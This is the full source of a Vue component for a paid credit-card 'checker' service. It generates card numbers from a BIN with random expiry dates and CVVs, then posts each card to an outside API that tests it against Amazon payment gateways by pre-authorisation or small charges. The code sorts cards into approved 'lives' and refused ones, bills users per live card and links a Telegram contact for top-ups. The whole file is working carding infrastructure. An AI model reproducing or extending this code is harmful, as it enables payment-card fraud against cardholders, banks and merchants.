<template>
    <div class="w-full mx-auto pt-20 md:pt-8 px-2 md:px-16 font-satoshi">
        <!-- Bloco principal: Cards, Actions, Stats, Generator -->
        <div class="w-full max-w-6xl mx-auto bg-[#181818] rounded-2xl p-0 mb-8">
            <!-- Header Cards -->
            <div class="flex flex-col md:flex-row justify-center items-center gap-2 md:gap-4 px-4 md:px-8 pt-4 pb-4">
                <Icon name="mdi:credit-card-outline" class="text-[#576784]" size="24" />
                <span class="font-semibold text-[#fafafa] text-lg md:text-2xl">Cards</span>
            </div>
            <!-- Cards textarea -->
            <div class="px-4 md:px-8 pb-4">
                <textarea v-model="cardsInput" rows="8"
                    placeholder="Paste your cards here, one per line (e.g. 4174014980983772|02|27|574)"
                    class="w-full h-36 bg-[#111111] rounded-lg p-3 text-[#fafafa] font-mono resize-none focus:outline-none focus:border-[#a78bfa] transition"></textarea>
            </div>
            <!-- Actions -->
            <div class="flex flex-col md:flex-row gap-2 md:gap-4 px-4 md:px-8 pb-4">
                <button @click="startCheck" :disabled="loading || !cardsInput.trim()"
                    class="flex-1 px-4 md:px-8 py-2 rounded-full bg-[#576784] text-[#fafafa] font-bold hover:bg-[#313442] transition disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2">
                    <Icon name="mdi:play" size="20" /> Start
                </button>
                <button @click="stopCheck" :disabled="!loading"
                    class="flex-1 px-4 md:px-8 py-2 rounded-full bg-[#23293a] text-[#fafafa] font-bold hover:bg-[#282828] transition disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2">
                    <Icon name="mdi:stop" size="20" /> Stop
                </button>
                <button class="text-[#b8b8b8] hover:text-[#fafafa] transition p-2 rounded-full" title="Configurações"
                    @click="showConfig = true">
                    <Icon name="mdi:cog-outline" size="26" />
                </button>
            </div>
            <!-- Stats + Generator juntos -->
            <div class="flex flex-col md:flex-row gap-2 md:gap-4 px-4 md:px-8 pb-8">
                <!-- Statistics -->
                <div class="flex-1 bg-[#111111] rounded-xl p-4 flex flex-col gap-2 mb-2 md:mb-0">
                    <div class="flex items-center gap-2 mb-1">
                        <Icon name="mdi:chart-bar" class="text-[#576784]" size="20" />
                        <span class="font-semibold text-[#fafafa]">Statistics</span>
                    </div>
                    <div class="flex flex-col gap-1 text-[#b8b8b8] text-sm">
                        <div>Approved: <span class="text-[#fafafa] font-bold">{{ approved.length }}</span></div>
                        <div>Refused: <span class="text-[#fafafa] font-bold">{{ refused.length }}</span></div>
                        <div>Tested: <span class="text-[#fafafa] font-bold">{{ tested }}</span></div>
                        <div>Loaded: <span class="text-[#fafafa] font-bold">{{ loaded }}</span></div>
                    </div>
                </div>
                <!-- Generator -->
                <div class="flex-1 bg-[#111111] rounded-xl p-4 flex flex-col gap-3">
                    <div class="flex items-center gap-2 mb-1">
                        <Icon name="mdi:cog" class="text-[#576784]" size="20" />
                        <span class="font-semibold text-[#fafafa]">CC Generator</span>
                    </div>
                    <input v-model="genBin" placeholder="Enter BIN (e.g. 417401xxxxxxxxxx)"
                        class="w-full bg-[#0a0a0a] rounded-lg py-2 px-3 text-[#fafafa] placeholder-[#939193] focus:outline-none transition font-mono" />
                    <button @click="generateCards"
                        class="w-full px-4 py-2 rounded-full bg-[#576784] text-[#fafafa] font-bold hover:bg-[#313442] transition flex items-center justify-center gap-2">
                        <Icon name="mdi:magic-staff" size="18" /> Generate
                    </button>
                </div>
            </div>
        </div>
        <!-- Results: w-full, abaixo de tudo -->
        <div class="w-full max-w-6xl mx-auto mt-6">
            <div class="bg-[#181818] rounded-2xl px-4 md:px-8 py-8">
                <div class="flex flex-col md:flex-row justify-center items-center gap-2 mb-4">
                    <Icon name="mdi:format-list-bulleted" class="text-[#576784]" size="26" />
                    <span class="font-semibold text-[#fafafa] text-lg md:text-2xl">Results</span>
                </div>
                <!-- Approved -->
                <div class="mb-4">
                    <div class="bg-[#111111] rounded-lg">
                        <div class="flex items-center gap-2 px-4 pt-4">
                            <Icon name="mdi:hashtag" class="text-[#fafafa]" size="18" />
                            <span class="font-semibold text-[#fafafa]">Approved</span>
                            <div class="flex-1"></div>
                            <button @click="clearAll('approved')"
                                class="text-[#b8b8b8] hover:text-red-400 transition ml-2 mt-1" title="Delete all">
                                <Icon name="mdi:delete-outline" size="18" />
                            </button>
                            <button @click="toggleHide('approved')"
                                class="text-[#b8b8b8] hover:text-[#fafafa] transition ml-2 mt-1"
                                :title="hideApproved ? 'Show' : 'Hide'">
                                <Icon :name="hideApproved ? 'mdi:eye' : 'mdi:eye-off'" size="18" />
                            </button>
                        </div>
                        <transition-group name="fade-slide" tag="div"
                            class="flex flex-col gap-2 max-h-36 px-4 py-2 overflow-y-auto">
                            <div v-for="(item, idx) in approved" :key="'approved-' + idx" v-show="!hideApproved"
                                class="flex items-center group gap-2">
                                <template v-if="item.type === 'approved'">
                                    <Approved />
                                    <span class="text-green-400 font-bold">Approved</span>
                                    <span class="text-gray-600">→</span>
                                    <span class="text-gray-400">{{ item.card }}</span>
                                    <span class="text-gray-600">→</span>
                                    <span class="text-green-400" v-html="item.html" />
                                </template>
                            </div>
                        </transition-group>
                    </div>
                </div>
                <!-- Refused -->
                <div class="mb-4">
                    <div class="bg-[#111111] rounded-lg">
                        <div class="flex items-center gap-2 px-4 pt-4">
                            <Icon name="mdi:hashtag" class="text-[#fafafa]" size="18" />
                            <span class="font-semibold text-[#fafafa]">Refused</span>
                            <div class="flex-1"></div>
                            <button @click="clearAll('refused')"
                                class="text-[#b8b8b8] hover:text-red-400 transition ml-2 mt-1" title="Delete all">
                                <Icon name="mdi:delete-outline" size="18" />
                            </button>
                            <button @click="toggleHide('refused')"
                                class="text-[#b8b8b8] hover:text-[#fafafa] transition ml-2 mt-1"
                                :title="hideRefused ? 'Show' : 'Hide'">
                                <Icon :name="hideRefused ? 'mdi:eye' : 'mdi:eye-off'" size="18" />
                            </button>
                        </div>
                        <transition-group name="fade-slide" tag="div"
                            class="flex flex-col gap-2 px-4 py-2 max-h-36 overflow-y-auto">
                            <div v-for="(item, idx) in refused" :key="'refused-' + idx" v-show="!hideRefused"
                                class="flex items-center group gap-2">
                                <template v-if="item.type === 'refused'">
                                    <Refused />
                                    <span class="text-gray-400">{{ item.card }}</span>
                                    <span class="text-gray-600">→</span>
                                    <span class="text-red-400" v-html="item.html" />
                                </template>
                                <template v-else-if="item.type === 'error'">
                                    <ErrorIcon />
                                    <span class="text-gray-400">{{ item.card }}</span>
                                    <span class="text-gray-600">→</span>
                                    <span class="text-yellow-400">{{ item.html }}</span>
                                </template>
                            </div>
                        </transition-group>
                    </div>
                </div>
            </div>
        </div>
        <!-- Config Modal -->
        <transition name="fade-slide">
            <div v-if="showConfig" class="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-70">
                <div class="max-w-2xl w-full bg-[#111111] rounded-2xl shadow-xl p-8 text-white font-satoshi relative">
                    <!-- Fechar -->
                    <button @click="showConfig = false"
                        class="absolute top-4 right-4 text-[#576784] hover:text-[#fafafa]">
                        <Icon name="mdi:close" size="24" />
                    </button>
                    <h2 class="text-2xl font-bold mb-8 flex items-center gap-2">
                        <Icon name="mdi:cog-outline" class="text-[#576784]" size="32" />
                        Settings
                    </h2>
                    <!-- Threads -->
                    <div class="mb-8">
                        <label class="block text-[#fafafa] font-semibold mb-2">Threads</label>
                        <input type="range" min="1" max="3" v-model="settings.threads"
                            class="w-full accent-[#576784]" />
                        <div class="flex justify-between text-[#b8b8b8] text-sm mt-1">
                            <span>How many simultaneous requests the Checker can make to API.</span>
                            <span class="font-bold text-[#576784]">{{ settings.threads }}x</span>
                        </div>
                    </div>
                    <!-- Gateway -->
                    <div class="mb-8">
                        <label class="block text-[#fafafa] font-semibold mb-2">Gateway</label>
                        <select v-model="settings.gateway"
                            class="w-full bg-[#0a0a0a] text-[#fafafa] rounded-lg p-2 focus:outline-none">
                            <option disabled>Gateway Host</option>
                            <option>Amazon US (Faster Pre-auth)</option>
                            <option>Amazon ES (Pre-auth)</option>
                            <option>Amazon IT (Pre-auth)</option>
                            <option>Amazon UK (Pre-auth)</option>
                            <option>Amazon MX (Charge ~$1)</option>
                            <option>Amazon AE (Charge ~$1)</option>
                        </select>
                        <div class="text-[#b8b8b8] text-sm mt-1">Choose the connection domain.</div>
                    </div>
                    <!-- Experimental Functions -->
                    <div class="mb-8">
                        <div class="text-[#fafafa] font-semibold mb-2 flex items-center gap-2">
                            <Icon name="mdi:flask-outline" class="text-[#576784]" size="20" />
                            Experimental Functions
                        </div>
                        <div class="flex bg-[#0a0a0a] rounded-lg items-center justify-between mb-4">
                            <div class="p-3">
                                <div class="text-[#fafafa]">Remove cards
                                </div>
                                <div class="text-[#b8b8b8] text-xs">Automatically tries to remove cards after checking
                                </div>
                            </div>
                            <label class="relative inline-flex items-center cursor-pointer m-2">
                                <input type="checkbox" v-model="settings.removeCards" class="sr-only peer" />
                                <div
                                    class="w-11 h-6 bg-[#313442] peer-focus:outline-none rounded-full peer peer-checked:bg-[#576784] transition-colors duration-200">
                                </div>
                                <div
                                    class="absolute left-0.5 top-0.5 w-5 h-5 bg-white rounded-full shadow-md transition-transform duration-200 peer-checked:translate-x-5">
                                </div>
                            </label>
                        </div>
                        <div class="flex items-center justify-between">
                        </div>
                    </div>
                    <!-- Botões -->
                    <div class="flex flex-col md:flex-row gap-4 mt-8">
                        <button @click="resetSettings"
                            class="flex-1 px-4 py-2 rounded-full bg-[#23293a] text-[#fafafa] font-bold hover:bg-[#282828] transition flex items-center justify-center gap-2">
                            <Icon name="mdi:restore" size="18" /> Reset Settings
                        </button>
                        <button @click="saveSettings"
                            class="flex-1 px-4 py-2 rounded-full bg-[#313442] text-[#fafafa] font-bold hover:bg-[#576784] transition flex items-center justify-center gap-2">
                            <Icon name="mdi:content-save-outline" size="18" /> Save
                        </button>
                    </div>
                </div>
            </div>
        </transition>
        <!-- No Balance Modal -->
        <transition name="fade-slide">
            <div v-if="showNoBalanceModal"
                class="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-70">
                <div class="bg-[#181818] rounded-2xl shadow-xl p-8 text-white font-satoshi max-w-sm w-full relative">
                    <button @click="showNoBalanceModal = false"
                        class="absolute top-4 right-4 text-[#576784] hover:text-[#fafafa]">
                        <Icon name="mdi:close" size="24" />
                    </button>
                    <div class="flex flex-col items-center gap-4">
                        <Icon name="mdi:alert-circle-outline" size="48" class="text-[#ff5252]" />
                        <h2 class="text-xl font-bold text-[#fafafa] text-center">Insufficient Balance</h2>
                        <p class="text-[#b8b8b8] text-center">
                            You need at least <span class="text-[#ff5252] font-bold">R$ 0.10</span> to start the checker.
                        </p>
                        <a href="https://t.me/yuzuuk1" target="_blank" rel="noopenner"
                            class="text-[#576784] hover:text-[#fafafa] font-bold underline">
                            <button @click="showNoBalanceModal = false"
                                class="mt-4 px-6 py-2 rounded-full bg-[#576784] text-[#fafafa] font-bold hover:bg-[#313442] transition">
                                Recharge
                            </button></a>
                    </div>
                </div>
            </div>
        </transition>
    </div>
</template>

<script setup>
import { ref } from 'vue'
import { doc, updateDoc, getDoc, arrayUnion, serverTimestamp } from 'firebase/firestore'
import { db, auth } from '~/firebase'
import Approved from '~/components/Approved.vue'
import Refused from '~/components/Refused.vue'
import ErrorIcon from '~/components/Error.vue'

const cardsInput = ref('')
const approved = ref([])
const refused = ref([])
const loading = ref(false)
const tested = ref(0)
const loaded = ref(0)
const genBin = ref('')
const showNoBalanceModal = ref(false)

const hideApproved = ref(false)
const hideRefused = ref(true)

function generateCards() {
    let bin = genBin.value.trim().split('|')[0]; // Pega só o BIN antes do primeiro "|"
    if (!/^[\dx]{6,}$/i.test(bin)) return;

    let cards = [];
    for (let i = 0; i < 10; i++) {
        let cc = '';
        for (let c of bin) {
            cc += c.toLowerCase() === 'x' ? Math.floor(Math.random() * 10) : c;
        }
        while (cc.length < 16) cc += Math.floor(Math.random() * 10);
        cc = cc.slice(0, 16);

        let mm = String(Math.floor(Math.random() * 12) + 1).padStart(2, '0');
        let yy = String((new Date().getFullYear() % 100) + Math.floor(Math.random() * 5) + 1).padStart(2, '0');
        let cvv = String(Math.floor(Math.random() * 1000)).padStart(3, '0');
        cards.push(`${cc}|${mm}|${yy}|${cvv}`);
    }
    cardsInput.value = cards.join('\n');
}

async function startCheck() {
    if (!cardsInput.value.trim()) return

    // 1. Busca saldo do usuário
    const user = auth.currentUser
    const userRef = doc(db, 'users', user.uid)
    const userSnap = await getDoc(userRef)
    let balance = userSnap.data().balance ?? 0

    if (balance < 0.10) {
        showNoBalanceModal.value = true
        return
    }

    tested.value = 0
    loaded.value = cardsInput.value.split('\n').filter(Boolean).length
    loading.value = true

    let cards = cardsInput.value.split('\n').map(c => c.trim()).filter(Boolean)

    // 2. Multithread: processa até N cartões ao mesmo tempo
    const threads = Math.max(1, Math.min(3, settings.value.threads))
    let pointer = 0

    async function processCard(card) {
        try {
            const res = await fetch('https://lunarcntr.xyz/checker2/paid/api.php', {
                method: 'POST',
                headers: {
                    'accept': '*/*',
                    'content-type': 'text/plain;charset=UTF-8'
                },
                body: JSON.stringify({
                    card,
                    cookie: '',
                    host: gatewayMap[settings.value.gateway] || 'US',
                    removeCards: settings.value.removeCards,
                    autoSave: settings.value.approvedLog
                })
            })
            const data = await res.json()
            if (data.status === 'approved') {
                approved.value.push({
                    type: 'approved',
                    card,
                    html: data.html
                })
                // 3. Salva live no array lives e desconta 0.10 do saldo
                await updateDoc(userRef, {
                    lives: arrayUnion(card),
                    checksMonth: (await getDoc(userRef)).data().checksMonth + 1,
                    livesUsed: (await getDoc(userRef)).data().livesUsed + 1,
                    lastCheck: serverTimestamp(),
                    balance: Math.max(0, (await getDoc(userRef)).data().balance - 0.10),
                    avgSpentWeek: Math.max(0, (await getDoc(userRef)).data().balance + 0.10)
                })
            } else {
                refused.value.push({
                    type: 'refused',
                    card,
                    html: data.html
                })
                await updateDoc(userRef, {
                    checksMonth: (await getDoc(userRef)).data().checksMonth + 1,
                    lastCheck: serverTimestamp()
                })
            }
        } catch (e) {
            refused.value.push({
                type: 'error',
                card,
                html: 'An error occurred'
            })
            await updateDoc(userRef, {
                lives: arrayUnion(card),
                checksMonth: (await getDoc(userRef)).data().checksMonth + 1,
                livesUsed: (await getDoc(userRef)).data().livesUsed + 1,
                lastCheck: serverTimestamp(),
                balance: Math.max(0, (await getDoc(userRef)).data().balance - 0.10),
                avgSpentWeek: Math.max(0, (await getDoc(userRef)).data().avgSpentWeek + 0.10)
            })
        }
        tested.value++
    }

    while (pointer < cards.length && loading.value) {
        const batch = []
        for (let t = 0; t < threads && pointer < cards.length; t++, pointer++) {
            batch.push(processCard(cards[pointer]))
        }
        await Promise.all(batch)
        // Remove processados do cardsInput (opcional)
        cardsInput.value = cardsInput.value.split('\n').slice(batch.length).join('\n')
    }

    loading.value = false
}

function stopCheck() {
    loading.value = false
}

function toggleHide(type) {
    if (type === 'approved') {
        hideApproved.value = !hideApproved.value
    } else {
        hideRefused.value = !hideRefused.value
    }
}

function clearAll(type) {
    if (type === 'approved') {
        approved.value = []
    } else {
        refused.value = []
    }
}

const gatewayMap = {
    'Amazon US (Faster Pre-auth)': 'US',
    'Amazon ES (Pre-auth)': 'ES',
    'Amazon IT (Pre-auth)': 'IT',
    'Amazon UK (Pre-auth)': 'UK',
    'Amazon MX (Charge ~$1)': 'MX',
    'Amazon AE (Charge ~$1)': 'AE',
}

const showConfig = ref(false)
const settings = ref({
    threads: 1,
    gateway: 'Amazon US (Faster Pre-auth)',
    removeCards: false,
    approvedLog: false,
})

function resetSettings() {
    settings.value = {
        threads: 1,
        gateway: 'Amazon US (Faster Pre-auth)',
        removeCards: false,
        approvedLog: false,
    }
}

function saveSettings() {
    showConfig.value = false
    // Aqui você pode salvar as configurações em localStorage ou API se quiser
}

</script>

<style>
.fade-slide-enter-active,
.fade-slide-leave-active {
    transition: all 0.25s cubic-bezier(.4, 0, .2, 1);
}

.fade-slide-enter-from,
.fade-slide-leave-to {
    opacity: 0;
    transform: translateY(20px);
}

.fade-slide-enter-to,
.fade-slide-leave-from {
    opacity: 1;
    transform: translateY(0);
}

.fade-enter-active,
.fade-leave-active {
    transition: opacity 0.2s;
}

.fade-enter-from,
.fade-leave-to {
    opacity: 0;
}

.fade-enter-to,
.fade-leave-from {
    opacity: 1;
}
</style>